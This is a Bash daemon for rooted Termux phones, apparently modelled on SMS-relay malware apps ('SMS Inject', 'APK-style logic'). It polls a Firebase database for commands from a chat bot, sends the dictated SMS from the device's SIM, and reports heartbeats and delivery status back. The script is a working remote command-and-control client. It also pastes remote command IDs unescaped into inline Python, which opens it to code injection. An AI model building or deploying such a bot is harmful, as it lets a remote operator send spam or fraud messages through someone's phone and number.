#!/data/data/com.termux/files/usr/bin/bash
# Firebase SMS Inject Daemon — APK-style logic for rooted Termux phones.
# Reads /apk_config and /commands/{device_id} from Firebase RTDB and sends SMS.

set -euo pipefail

CONFIG_FILE="${HOME}/.firebase_sms_config"
STATE_FILE="${HOME}/.firebase_sms_state"
LOG_FILE="${HOME}/.firebase_sms.log"
POLL_INTERVAL=3

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

load_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo "Config missing. Run: bash firebase_daemon.sh setup"
        exit 1
    fi
    # shellcheck disable=SC1090
    source "$CONFIG_FILE"
    : "${FIREBASE_URL:?FIREBASE_URL not set}"
    DEVICE_ID="${DEVICE_ID:-$(getprop ro.serialno 2>/dev/null || hostname)}"
    FIREBASE_URL="${FIREBASE_URL%/}"
}

save_state() {
    echo "PROCESSED=$(printf '%s\n' "${PROCESSED_IDS[@]:-}")" > "$STATE_FILE"
}

load_state() {
    PROCESSED_IDS=()
    if [ -f "$STATE_FILE" ]; then
        while IFS= read -r line; do
            [ -n "$line" ] && PROCESSED_IDS+=("$line")
        done < <(grep '^PROCESSED=' "$STATE_FILE" | sed 's/^PROCESSED=//' | tr ' ' '\n' | grep -v '^$' || true)
    fi
}

is_processed() {
    local id="$1"
    for existing in "${PROCESSED_IDS[@]:-}"; do
        [ "$existing" = "$id" ] && return 0
    done
    return 1
}

mark_processed() {
    local id="$1"
    PROCESSED_IDS+=("$id")
    if [ "${#PROCESSED_IDS[@]}" -gt 200 ]; then
        PROCESSED_IDS=("${PROCESSED_IDS[@]: -100}")
    fi
    save_state
}

check_sms_send() {
    if ! command -v termux-sms-send >/dev/null 2>&1; then
        log "❌ termux-sms-send not found. Run: pkg install termux-api"
        exit 1
    fi
}

send_sms() {
    local to_number="$1"
    local message="$2"
    local sim_index="${3:-0}"
    local sim_slot=$((sim_index + 1))

    if termux-sms-send -n "$to_number" -s "$sim_slot" "$message" 2>>"$LOG_FILE"; then
        log "📤 SMS sent to $to_number via SIM $sim_slot"
        return 0
    fi
    log "❌ Failed to send SMS to $to_number"
    return 1
}

update_command_status() {
    local command_id="$1"
    local status="$2"
    curl -sf -X PATCH "${FIREBASE_URL}/commands/${DEVICE_ID}/${command_id}.json" \
        -d "{\"status\":\"${status}\",\"sent_at\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" >/dev/null || true
}

fetch_apk_config() {
    curl -sf "${FIREBASE_URL}/apk_config.json" 2>/dev/null || echo "{}"
}

process_commands() {
    local raw
    raw="$(curl -sf "${FIREBASE_URL}/commands/${DEVICE_ID}.json" 2>/dev/null || echo "{}")"
    [ -z "$raw" ] || [ "$raw" = "null" ] && return

    local ids
    ids="$(echo "$raw" | python3 -c "
import json, sys
data = json.load(sys.stdin)
if isinstance(data, dict):
    print(' '.join(data.keys()))
" 2>/dev/null || true)"

    for command_id in $ids; do
        is_processed "$command_id" && continue

        local to message sim_index status
        to="$(echo "$raw" | python3 -c "
import json, sys
data = json.load(sys.stdin)
cmd = data.get('$command_id', {})
print(cmd.get('to', ''))
" 2>/dev/null || true)"
        message="$(echo "$raw" | python3 -c "
import json, sys
data = json.load(sys.stdin)
cmd = data.get('$command_id', {})
print(cmd.get('message', ''))
" 2>/dev/null || true)"
        sim_index="$(echo "$raw" | python3 -c "
import json, sys
data = json.load(sys.stdin)
cmd = data.get('$command_id', {})
print(cmd.get('sim_index', 0))
" 2>/dev/null || true)"
        status="$(echo "$raw" | python3 -c "
import json, sys
data = json.load(sys.stdin)
cmd = data.get('$command_id', {})
print(cmd.get('status', 'pending'))
" 2>/dev/null || true)"

        [ "$status" != "pending" ] && mark_processed "$command_id" && continue
        [ -z "$to" ] || [ -z "$message" ] && continue

        if send_sms "$to" "$message" "$sim_index"; then
            update_command_status "$command_id" "sent"
            mark_processed "$command_id"
        else
            update_command_status "$command_id" "failed"
        fi
    done
}

heartbeat() {
    curl -sf -X PATCH "${FIREBASE_URL}/devices/${DEVICE_ID}.json" \
        -d "{\"online\":true,\"last_seen\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" >/dev/null || true
}

run_daemon() {
    load_config
    load_state
    check_sms_send

    log "🚀 Firebase daemon started"
    log "🔥 Firebase: $FIREBASE_URL"
    log "📱 Device ID: $DEVICE_ID"

    local config
    config="$(fetch_apk_config)"
    log "⚙️ APK config: $config"

    while true; do
        heartbeat
        process_commands
        sleep "$POLL_INTERVAL"
    done
}

run_setup() {
    echo "📱 Firebase SMS Inject — Termux Setup"
    echo "===================================="
    echo ""
    echo "Bot mein pehle /key <firebase-url> bhejo."
    echo "Phir /fy <device_id> se device select karo."
    echo ""

    read -rp "Firebase URL (e.g. https://base-e3797-default-rtdb.firebaseio.com): " FIREBASE_URL
    read -rp "Device ID (bot ka /fy device id) [auto]: " DEVICE_ID

    FIREBASE_URL="${FIREBASE_URL%/}"
    DEVICE_ID="${DEVICE_ID:-$(getprop ro.serialno 2>/dev/null || hostname)}"

    cat > "$CONFIG_FILE" <<EOF
FIREBASE_URL="$FIREBASE_URL"
DEVICE_ID="$DEVICE_ID"
EOF

    : > "$STATE_FILE"
    echo ""
    echo "✅ Config saved to $CONFIG_FILE"
    echo ""
    echo "Start daemon:"
    echo "  bash firebase_daemon.sh start"
}

case "${1:-}" in
    setup) run_setup ;;
    start) run_daemon ;;
    *)
        echo "Usage: bash firebase_daemon.sh {setup|start}"
        exit 1
        ;;
esac
